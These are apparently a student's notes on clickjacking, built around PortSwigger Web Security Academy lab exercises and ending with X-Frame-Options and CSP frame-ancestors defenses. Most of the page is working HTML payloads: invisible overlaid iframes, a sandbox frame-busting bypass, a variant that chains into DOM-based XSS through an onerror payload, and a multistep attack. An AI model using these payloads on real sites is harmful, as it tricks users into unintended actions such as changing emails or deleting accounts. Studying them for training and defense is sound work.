---
layout: default
title: "Clickjacking"
parent: "Web Application"
nav_order: 8
---

Different from CSRF because the session is established, the victim just needs to click a button vs a having the whole request mnaipulated
- As such ant-CSRF tokens don't really help

Ex:
```HTML
<style> 
	iframe { 
		position:relative; 
		width:$width_value; 
		height: $height_value; 
		opacity: $opacity; 
		z-index: 2; 
	} 
	div { 
		position:absolute; 
		top:$top_value; 
		left:$side_value; 
		z-index: 1; 
		} 
</style> 
<div>Test me</div> <
iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
- Refit `$width_value`, `$height_value`, `$opacity`(to close to zero), `$top_value`, `$side_value`
- The goal is to make the "Click Me" button hover over the "Delete Account" button


### Frame busting
`sandbox="allow-forms"` attribute can neutralize frame busting, the security measure

```HTML
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:445px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://0ab7007a04fed97f80bd0dd3006d00d7.web-security-academy.net/my-account?email=pop69@website.com"></iframe>
```



### Clickjacking to trigger DOM-based XSS

```HTML
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
	}
	div {
		position:absolute;
		top:610px;
		left:80px;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe
src="https://0a7300960470bb4583a107f500890094.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```


## Multistep Clickjacking


```HTML
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:490px;
		left:80px;
		z-index: 1;
	}
   .secondClick {
		top:300px;
		left:200px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a3a0036037898d381adf8ef004c0066.web-security-academy.net/my-account"></iframe>
```


## Prevent

### X-Frame-Options

X-Frame-Options was originally introduced as an unofficial response header in Internet Explorer 8 and it was rapidly adopted within other browsers. The header provides the website owner with control over the use of iframes or objects so that inclusion of a web page within a frame can be prohibited with the `deny` directive:
`X-Frame-Options: deny`

Alternatively, framing can be restricted to the same origin as the website using the `sameorigin` directive:
`X-Frame-Options: sameorigin`

or to a named website using the `allow-from` directive:
`X-Frame-Options: allow-from https://normal-website.com`

X-Frame-Options is not implemented consistently across browsers (the `allow-from` directive is not supported in Chrome version 76 or Safari 12 for example). However, when properly applied in conjunction with Content Security Policy as part of a multi-layer defense strategy it can provide effective protection against clickjacking attacks.

### Content Security Policy (CSP)
Content Security Policy (CSP) is a *detection and prevention mechanism that provides mitigation against attacks such as XSS and clickjacking*. CSP is usually implemented in the web server as a **return header** of the form:

`Content-Security-Policy: policy`

where policy is a string of policy directives separated by semicolons. The CSP provides the client browser with information about permitted sources of web resources that the browser can apply to the detection and interception of malicious behaviors.

The recommended clickjacking protection is to incorporate the `frame-ancestors` directive in the application's Content Security Policy. The `frame-ancestors 'none'` directive is similar in behavior to the X-Frame-Options `deny` directive. The `frame-ancestors 'self'` directive is broadly equivalent to the X-Frame-Options `sameorigin` directive. The following CSP whitelists frames to the same domain only:
`Content-Security-Policy: frame-ancestors 'self';`

Alternatively, framing can be restricted to named sites:
`Content-Security-Policy: frame-ancestors normal-website.com;`